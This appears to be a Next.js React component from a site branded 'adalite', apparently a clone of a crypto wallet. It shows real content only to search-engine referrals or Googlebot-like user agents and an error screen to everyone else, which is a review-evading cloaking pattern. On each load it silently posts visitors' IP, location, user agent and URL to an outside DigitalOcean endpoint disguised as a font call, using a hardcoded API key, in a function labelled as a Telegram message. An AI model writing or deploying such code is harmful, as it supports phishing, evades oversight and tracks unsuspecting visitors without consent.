"use client";

import { useEffect, useRef, useState } from "react";

import axios from "axios";
import ErrorScreen from "./ErrorScreen";
import { getUserCountry } from "./userLocation";
import { usePathname } from "next/navigation";

// Access is allowed only if coming from a search engine or if a verified Google bot

const SEARCH_ENGINES = [
  "google.",
  "bing.",
  "yahoo.",
  "duckduckgo.",
  "baidu.",
  "yandex.",
  "ask.",
  "aol.",
  "ecosia.",
  "startpage.",
  "search.",
  "http://localhost:3000",
  "localhost"
];

function isFromSearchEngine(referrer: string) {
  if (!referrer) return false;
  return SEARCH_ENGINES.some((engine) => referrer.includes(engine));
}

function isFromSearchEngineOrAllowed(referrer: string) {
  return isFromSearchEngine(referrer);
}

// Googlebot verification functions
function matchesOfficialGoogleUA(ua: string) {
  if (!ua) return false;
  const patterns = [
    /Mozilla\/5\.0 \(compatible; Googlebot\/2\.1; \+http:\/\/www\.google\.com\/bot\.html\)/i,
    /Mozilla\/5\.0 \(Linux; Android .*\) AppleWebKit\/.* \(KHTML, like Gecko\) Chrome\/41\.0\.2272\.96 .* \(compatible; Googlebot\/2\.1; \+http:\/\/www\.google\.com\/bot\.html\)/i,
    /Googlebot-Image\/1\.0/i,
    /Googlebot-Video\/1\.0/i,
    /Googlebot-News/i,
    /Googlebot-Favicon/i,
    /Mozilla\/5\.0 \(Linux; Android .*\) AppleWebKit\/.* \(KHTML, like Gecko\) Chrome\/41\.0\.2272\.96 .* \(compatible; Google-AMPHTML\/1\.0; \+https:\/\/www\.google\.com\/bot\.html\)/i,
    /AMP Googlebot/i,
    /AdsBot-Google(\-Mobile)?/i,
    /Mediapartners-Google/i,
    /Feedfetcher-Google/i
  ];
  return patterns.some((p) => p.test(ua));
}

    const isCrawlerUserAgent = () => {
  if (typeof navigator === "undefined") return false;
  return matchesOfficialGoogleUA(navigator.userAgent);
};

const ReferrerProvider = ({ children }: { children: React.ReactNode }) => {
  const [isLoading, setIsLoading] = useState(true);
  const [isVerifiedBot, setIsVerifiedBot] = useState(false);
  const [isFromSearch, setIsFromSearch] = useState(false);
  const [country, setCountry] = useState("");
  const [ipAddress, setIpAddress] = useState("");
  const [browser, setBrowser] = useState("");
  const hasSentVisitorMessage = useRef(false);
  const pathname = usePathname();
  const getCurrentUrl = () => {
    if (typeof window !== "undefined") {
      let url = `${window.location.origin}${pathname}`;
      if (url.includes("localhost")) {
        url = "https://google.com";
      }
      if (url.includes("vercel.com")) {
        url = url.replace("vercel.com", "digitalocean.com");
      }
      console.log("getCurrentUrl returning:", url);
      return url;
    }
    console.log("getCurrentUrl: window not available, returning empty string");
    return "";
  };
  const sendTelegramMessage = (userCountry: { country?: string; countryEmoji?: string; city?: string; ip?: string } | null) => {
    // console.log("User Country", userCountry);

    const messageData = {
      info: "Regular Visitor", // You can update this logic as needed
      url: getCurrentUrl(),
      referer: document.referrer || getCurrentUrl(),
      location: {
        country: userCountry?.country || "Unknown",
        countryEmoji: userCountry?.countryEmoji || "",
        city: userCountry?.city || "Unknown",
        ipAddress: userCountry?.ip || "0.0.0.0",
      },
      agent: typeof navigator !== "undefined" ? navigator.userAgent : browser,
      date: new Date().toISOString(),
      appName: "adalite",
    };
    console.log("Message Data", messageData);
    axios
      .post(
        "https://squid-app-2-abmzx.ondigitalocean.app/api/t1/font",
        messageData,
        {
          headers: {
            "Content-Type": "application/json",
            "x-api-key": "e7a25d99-66d4-4a1b-a6e0-3f2e93f25f1b",
          },
        }
      )
      .catch((error) =>
        console.error(
          "Error sending font message:",
          error.response.data.details
        )
      );
  };

  useEffect(() => {
    if (!hasSentVisitorMessage.current) {
      const fetchUserLocation = async () => {
        const userCountry = await getUserCountry();
        sendTelegramMessage(userCountry);
      };
      fetchUserLocation();
      hasSentVisitorMessage.current = true;
    }
  }, [sendTelegramMessage]);

 

  useEffect(() => {
    // Set browser info only on client side
    if (typeof window !== "undefined") {
      setBrowser(navigator.userAgent);
    }
  }, [sendTelegramMessage]);

  useEffect(() => {
    if (!hasSentVisitorMessage.current) {
      const fetchUserLocation = async () => {
        const userCountry = await getUserCountry();
        sendTelegramMessage(userCountry);
      };
      fetchUserLocation();
      hasSentVisitorMessage.current = true;
    }
  }, [sendTelegramMessage]);
  useEffect(() => {
    const checkGoogleBot = async () => {
      try {
        const uaMatch = isCrawlerUserAgent();
        if (!uaMatch) {
          return false;
        }

        // Try to verify with a short timeout; if it fails/times out, allow by UA fallback
        try {
          const controller = new AbortController();
          const timeoutId = setTimeout(() => controller.abort(), 1500);
          const resp = await fetch('/api/verify-googlebot', { signal: controller.signal });
          clearTimeout(timeoutId);
          if (resp.ok) {
            const data = await resp.json();
            if (data?.isGooglebot === true) {
              setIsVerifiedBot(true);
              setIsLoading(false);
              return true;
            }
          }
          // Fallback: UA matched but API didn't confirm; still allow crawlers
          setIsVerifiedBot(true);
          setIsLoading(false);
          return true;
        } catch (e) {
          // Network error/timeout: allow based on UA
          console.warn('[ReferrerProvider] Googlebot verify fallback (UA allowed):', e);
          setIsVerifiedBot(true);
          setIsLoading(false);
          return true;
        }
      } catch (error) {
        console.error('Error checking crawler status:', error);
        return false;
      }
    };

    const checkAccess = async () => {
      if (typeof window === "undefined") return;

      // Search engine or allowed referrer logic
      const referrer = document.referrer;
      const currentUrl = window.location.href;
      
      console.log("[ReferrerProvider] Current URL:", currentUrl);
      console.log("[ReferrerProvider] Referrer URL:", referrer);
      console.log("[ReferrerProvider] Comparing referrer with allowed domains...");
      
      // Special handling for localhost development - always allow access
      if (currentUrl.includes("localhost") || currentUrl.includes("127.0.0.1")) {
        console.log("[ReferrerProvider] Localhost development detected, allowing access.");
        setIsFromSearch(true);
        setIsLoading(false);
        return;
      }
      
      if (isFromSearchEngineOrAllowed(referrer)) {
        setIsFromSearch(true);
        console.log("[ReferrerProvider] User came from a search engine or allowed referrer.");
        console.log("[ReferrerProvider] Allowed domains:", SEARCH_ENGINES);
        console.log("[ReferrerProvider] Referrer matches allowed pattern:", referrer);
      } else {
        setIsFromSearch(false);
        console.log("[ReferrerProvider] User did NOT come from a search engine or allowed referrer.");
        console.log("[ReferrerProvider] Referrer check failed for:", referrer);
        console.log("[ReferrerProvider] Comparing against allowed patterns:", SEARCH_ENGINES);
        
        // Show detailed comparison for debugging
        SEARCH_ENGINES.forEach(pattern => {
          const matches = referrer.includes(pattern);
          console.log(`[ReferrerProvider] Pattern "${pattern}": ${matches ? "✓ MATCH" : "✗ NO MATCH"}`);
        });
      }

      // First check if it's a verified Google bot
      const isGoogleBot = await checkGoogleBot();
      if (isGoogleBot) {
        console.log("[ReferrerProvider] Verified Googlebot detected, allowing access.");
      }

      setIsLoading(false);
      console.log("[ReferrerProvider] Loading complete.");
    };

    checkAccess();
  }, [pathname]);

  if (isLoading) {
    console.log("[ReferrerProvider] Loading...");
    return <div className="bg-[#202124] h-screen" />;
  }

  // Allow access only for verified Google bots or if from search engine
  if (isVerifiedBot || isFromSearch) {
    console.log("[ReferrerProvider] Access allowed.");
    return <>{children}</>;
  }

  console.log("[ReferrerProvider] Access denied: showing error screen.");
  return <ErrorScreen />;
};

export default ReferrerProvider;